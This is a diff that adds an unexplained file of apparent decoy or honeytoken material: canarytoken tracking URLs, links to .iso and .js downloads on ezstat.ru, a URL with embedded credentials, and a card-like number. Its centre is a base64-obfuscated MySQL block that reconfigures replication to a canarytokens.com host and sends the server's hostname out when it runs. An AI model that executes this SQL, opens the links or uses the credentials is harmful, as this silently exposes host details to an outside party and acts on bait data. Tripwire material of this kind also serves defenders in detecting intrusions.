@@ -1,0 +1,19 @@
+http://canarytokens.com/tags/about/9uhaa3vjvx8gzdy8ypgh15sb9/contact.php
+https://ezstat.ru/calls89009627198.iso
+https://ezstat.ru/79009627198.js
+http://canarytokens.com/feedback/articles/stuff/na16no01uq54o3uu36z7rcro4/post.jsp
+http://away.vk.com/away.php?rh=1758e8a5-a378-4e32-bcfe-72150e48dcda
+https://user:50dac6a0eefa773b7d7a855d9f51e8db35be34be@docvaultstorage.com
+https://canarytokens.com/about/images/yvng6egpzg54ogca5sgqc6157/index.html
+https://vk.cc/cNW7e5
+https://clck.ru/3NGJsN
+SET @b = U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIFJFUExJQ0FUSU9OIFNPVVJDRSBUTyBTT1VSQ0VfUEFTU1dPUkQ9J215LXNlY3JldC1wdycsIFNPVVJDRV9SRVRSWV9DT1VOVD0xLCBTT1VSQ0VfUE9SVD0zMzA2LCBTT1VSQ0VfSE9TVD0naGJtMGw3bGY4cTZ5bHVsOXEwbjJmdDFiNi5jYW5hcnl0b2tlbnMuY29tJywgU09VUkNFX1VTRVI9J2hibTBsN2xmOHE2eWx1bDlxMG4yZnQxYjYiLCBAQGxjX3RpbWVfbmFtZXMsIEBAaG9zdG5hbWUsICInOyI=;
+SET @s2 = FROM_BASE64(@b);
+PREPARE stmt1 FROM @s2;
+EXECUTE stmt1;
+PREPARE stmt2 FROM @bb;
+EXECUTE stmt2;
+START REPLICA;
+
+https://id.yandex.ru/promo/25?mascot=content-keeper
+2202 2032 2701 2913
